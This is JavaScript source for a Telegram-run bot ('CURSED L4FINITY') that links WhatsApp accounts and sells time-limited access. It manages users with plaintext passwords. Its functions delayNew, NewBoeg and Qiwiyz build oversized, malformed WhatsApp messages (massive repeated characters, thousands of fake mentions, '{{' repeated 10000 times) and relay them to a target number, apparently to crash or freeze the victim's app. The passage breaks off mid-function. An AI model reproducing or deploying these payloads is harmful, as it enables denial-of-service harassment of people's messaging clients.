const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const VPS = config.ipvps;
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const PORT = config.port;
const file = "./akses.json";
const { getUsers, saveUsers } = require("./database/userStore.js");

let userApiBug = null;

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const userPath = path.join(__dirname, "./database/user.json");

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  const allOwners = [config.owner, ...data.owners.map(x => x.toString())];
  return allOwners.includes(id.toString());
}

function isAdmin(userId) {
  const users = getUsers();
  const user = users.find(u => u.telegram_id === userId);
  return user && (user.role === "admin" || user.role === "owner");
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

module.exports = { loadAkses, saveAkses, isOwner, isAuthorized };

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 24 * 60 * 60 * 1000 : value * 60 * 60 * 1000;
}
  
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  generateRandomMessageId,
  prepareWAMessageMedia,
  getContentType,
  mentionedJid,
  relayWAMessage,
  templateMessage,
  InteractiveMessage,
  Header,
  MediaType,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMediaUpload,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Presence,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  areJidsSameUser,
  ChatModification,
  getStream,
  isBaileys,
  jidDecode,
  processTime,
  ProxyAgent,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  Browsers,
  Browser,
  WAFlag,
  WAContextInfo,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  WAProto,
  proto,
  BaileysError,
} = require('lotusbail');

let Ataa;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    Ataa = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      Ataa.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, Ataa);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      Ataa.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  Ataa = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  Ataa.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, Ataa);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await Ataa.requestPairingCode(BotNumber, "ATAAXWEB");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  Ataa.ev.on("creds.update", saveCreds);
  return Ataa;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});
console.clear();
console.log(chalk.magenta(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡿⠿⢿⣷⣶⣤⡀⢀⣤⣶⣾⣿⠿⠿⣿⣷⣶⣶⣤⣄⣀⡀
⠉⠁⢀⣾⣿⣭⣍⡛⠻⠟⠋⠉⠙⠻⠿⠛⠛⠉⠉⠙⠻⠿⠋
⢀⣾⡿⠋⠁⠀⠈⠙⠛⠶⣶⣤⣄⡀⠀⠀⠀⠀⢀⣠⡾⠃⠀
⠸⣿⣧⣀⣤⣴⣶⣶⣶⣦⣤⣈⣉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀
⠀⠈⠻⢿⣿⣿⡿⠿⠿⠿⠿⠿⠟⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀
⠀⠈⠙⠛⠛⠓⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡤⠤⠤⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣤⣤⣀
⣶⣿⣯⣭⣽⣿⣿⣿⣷⣶⣤⣄⡀⢀⣤⣾⣿⣿⣿⣯⣭⣿⣿
⠘⠿⠿⠛⠉⠉⠉⠛⠛⠿⣿⣿⣿⠿⠛⠋⠉⠉⠉⠉⠉⠙⠋
𝔇𝔢𝔰𝔱𝔯𝔬𝔶 𝔱𝔥𝔢 𝔫𝔬𝔯𝔪. 𝔅𝔢𝔠𝔬𝔪𝔢 𝔲𝔫𝔯𝔢𝔞𝔩.⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╔══════════════════════════════════════╗
║       ${chalk.bgBlackBright.bold(' CURSED SYSTEM ACTIVE ')}         ║
╠══════════════════════════════════════╣
║   ${chalk.cyanBright('ID OWNER')}   : ${chalk.yellowBright(OwnerId)}        
║   ${chalk.magentaBright('STATUS')}     : ${chalk.greenBright('BOT CONNECTED ✅')} 
╚══════════════════════════════════════╝
`))
initializeWhatsAppConnections();

function owner(userId) {
  return config.owner.includes(userId.toString());
}

// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
bot.start((ctx) => {
  const name = ctx.from.first_name || "User";

  const message = `
👾 *Welcome to CURSED L4FINITY!*

🛡️ SYSTEM COMMAND ACCESS 🛡️

/adduser   → Create User
/deluser   → Remove User
/addowner   → Create Owner
/delowner   → Remove Owner
/addadmin     → Create Admin
/deladmin     → Remove Admin
/edituser     → Change user
/extend    → Extend Expired
/listuser    → Reveal All Active User  
/connect    → Bind Your Bot Session  
/listsender   → Trace Active Sender
/delsender   → Purge Sender Identity

💬 CONTACT ADMIN  
└─ (https://t.me/DELION9Q)

_You are now inside the grid.  
Power is yours to command._
`;

  ctx.replyWithMarkdown(message, {
    disable_web_page_preview: true
  });
});

bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("Hanya owner yang bisa menambahkan sender.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);

  }
});


bot.command("adduser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya admin/owner yang bisa menambah user.");
  }

  if (args.length !== 4) {
    return ctx.reply("Format: /adduser username password durasi");
  }

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply("❌ Username sudah terdaftar.");
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "user" });
  saveUsers(users);
  
  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``
  
  return ctx.reply(
    `✅ User berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("deluser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya admin/owner yang bisa menghapus user.");
  }

  if (args.length !== 2) {
    return ctx.reply("Format: /deluser username");
  }

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) return ctx.reply("❌ Username tidak ditemukan.");
  if (users[index].role === "owner" && !isOwner(userId)) {
    return ctx.reply("❌ Admin tidak bisa menghapus user owner.");
  }

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ User *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menambahkan OWNER.");
  if (args.length !== 4) return ctx.reply("Format: /addowner Username Password Durasi");

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "owner" });
  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``
  
  return ctx.reply(
    `✅ Owner berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menghapus OWNER.");
  if (args.length !== 2) return ctx.reply("Format: /delowner username");

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username && u.role === "owner");

  if (index === -1) {
    return ctx.reply(`❌ Username *${username}* tidak ditemukan atau bukan owner.`, { parse_mode: "Markdown" });
  }

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ Owner *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addadmin", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menambahkan ADMIN.");
  if (args.length !== 4) return ctx.reply("Format: /addadmin Username Password Durasi");

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "admin" });
  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``
  
  return ctx.reply(
    `✅ Admin berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("deladmin", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menghapus ADMIN.");
  if (args.length !== 2) return ctx.reply("Format: /deladmin username");

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) return ctx.reply(`❌ Username *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  if (users[index].role !== "admin") return ctx.reply(`⚠️ *${username}* bukan admin.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ Admin *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("listuser", (ctx) => {
  const userId = ctx.from.id;
  if (!isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya admin/owner yang bisa menggunakan perintah ini.");
  }

  const users = getUsers();
  const isOwnerUser = isOwner(userId);

  let text = `📋 Daftar Pengguna:\n\n`;
  users.forEach((user) => {
    if (!isOwnerUser && user.role === "owner") return; // Admin tidak boleh lihat owner
    text += `👤 *${user.username}*\n🔑 ${user.password}\n📅 Exp: ${new Date(user.expired).toLocaleString("id-ID")}\n🎖️ Role: ${user.role}\n\n`;
  });

  return ctx.reply(text.trim(), { parse_mode: "Markdown" });
});

bot.command("edituser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya admin/owner yang bisa mengedit user.");
  }

  if (args.length < 5) {
    return ctx.reply("Format: /edituser Username Password Durasi Role");
  }

  const [_, username, password, durasi, role] = args;
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) {
    return ctx.reply(`❌ Username *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  if (!["user", "admin", "owner"].includes(role)) {
    return ctx.reply(`⚠️ Role hanya bisa: User, Admin, Owner.`, { parse_mode: "Markdown" });
  }

  if (role === "owner" && !isOwner(userId)) {
    return ctx.reply("❌ Kamu bukan owner, tidak bisa membuat user role owner.");
  }

  users[index] = {
    ...users[index],
    password,
    expired: Date.now() + parseInt(durasi) * 86400000,
    role
  };

  saveUsers(users);
  return ctx.reply(`✅ User *${username}* berhasil diperbarui.`, { parse_mode: "Markdown" });
});

bot.command("extend", (ctx) => {
  const userId = ctx.from.id;
  if (!isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya admin/owner yang bisa memperpanjang masa aktif.");
  }

  const args = ctx.message.text.split(" ");
  if (args.length !== 3) return ctx.reply("Format: /extend Username Durasi");

  const [_, username, durasi] = args;
  const days = parseInt(durasi);
  if (isNaN(days) || days <= 0) return ctx.reply("❌ Durasi harus berupa angka lebih dari 0.");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply("❌ Username tidak ditemukan.");
  if (users[index].role === "owner") return ctx.reply("⛔ Tidak bisa memperpanjang masa aktif untuk user role owner.");

  const now = Date.now();
  const base = users[index].expired > now ? users[index].expired : now;
  users[index].expired = base + (days * 86400000);

  saveUsers(users);
  ctx.reply(`✅ Masa aktif *${username}* berhasil diperpanjang hingga ${new Date(users[index].expired).toLocaleString("id-ID")}`, { parse_mode: "Markdown" });
});

// -------------------( ANDRO FUNC )------------------------------ \\

async function delayNew(obejctive, mention = true ) {
try {
    let sxo = await generateWAMessageFromContent(obejctive, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "‼️⃟가이𝑺𝒏𝒊𝒕𝒉𝐸𝑥𝟹𝑐.",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
   let sXoMessage = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: obejctive,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

     const xso = generateWAMessageFromContent(obejctive, sXoMessage, {});
      await Ataa.relayMessage("status@broadcast", xso.message, {
        messageId: xso.key.id,
        statusJidList: [obejctive],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: obejctive }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500) //sleep nya optional
     if (mention) {
        await Ataa.relayMessage(obejctive, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: xso.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    await Ataa.relayMessage("status@broadcast", sxo.message, {
        messageId: sxo.key.id,
        statusJidList: [obejctive],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: obejctive }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500);
    if (mention) {
        await Ataa.relayMessage(obejctive, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: sxo.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
} catch (error) {
  console.error("Error di :", error, "Bodooo");
 }
}


const mediaData = [
  {
    ID: "68917910",
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
  },
  {
    ID: "68884987",
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
  },
];

let sequentialIndex = 0;

async function NewBoeg(objective) {

const selectedMedia = mediaData[sequentialIndex];

  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const MD_ID = selectedMedia.ID;
  const MD_Uri = selectedMedia.uri;
  const MD_Buffer = selectedMedia.buffer;
  const MD_SID = selectedMedia.sid;
  const MD_sha256 = selectedMedia.SHA256;
  const MD_encsha25 = selectedMedia.ENCSHA256;
  const mkey = selectedMedia.mkey;

  let parse = true;
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  
    let Sugandih = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "ោ៝".repeat(10000),
    title: "kopi dangdut",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };
  
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
          fileSha256: MD_sha256,
          fileEncSha256: MD_encsha25,
          mediaKey: mkey,
          mimetype: type,
          directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };


  let tmsg = await generateWAMessageFromContent(objective, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: Math.floor(Math.random() * 99999),
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ],
        quotedMessage: {
           imageMessage: {
               url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
               mimetype: "image/jpeg",
               caption:"ោ៝".repeat(6000),
               fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
               fileLength: "19769",
               height: 354,
               width: 783,
               mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
               fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
               directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
               mediaKeyTimestamp: "1743225419",
               jpegThumbnail: null,
                scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                scanLengths: [2437, 17332],
                 contextInfo: {
                    isSampled: true,
                    participant: objective,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9999,
                    isForwarded: true
                }
            }         
        },
        annotations: [
          {
            embeddedContent: { Sugandih },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});
  const msg = generateWAMessageFromContent(objective, message, {});
  const msgg = generateWAMessageFromContent(objective, tmsg, {});

  await Ataa.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [objective],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: objective },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
 
  await Ataa.relayMessage("status@broadcast", msgg.message, {
    messageId: msgg.key.id,
    statusJidList: [objective],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: objective },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function Qiwiyz(X) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "COURSED" + "ꦾ".repeat(6666),
            },
            footer: {
              text: "Hii",
            },
            contextInfo: {
              participant: X,
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true 
                  }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: "@blek_trot",
                    criador: "@blek_trot",
                    ws: {
                    _eventsCount: 1 * 88888888.8888,
                    },
                  }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: "@blek_trot",
                    criador: "@blek_trot",
                    ws: {
                    _eventsCount: 1 * 88888888.8888,
                    }, 
                  }),
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
        },
      },
    };
    
    let messagee = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "COURSED" + "ꦾ".repeat(6666),
            },
            footer: {
              text: "Hii",
            },
            contextInfo: {
              participant: X,
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
        },
      },
    };

    const pertama = await Ataa.relayMessage(X, message, {
      messageId: "",
      participant: { jid: X },
      userJid: X,
    });

    const kedua = await Ataa.relayMessage(X, messagee, {
      messageId: "",
      participant: { jid: X },
      userJid: X,
    });

    await Ataa.sendMessage(X, {
      delete: {
        fromMe: true,
        remoteJid: X,
        id: pertama,
      }
    });

    await Ataa.sendMessage(X, { 
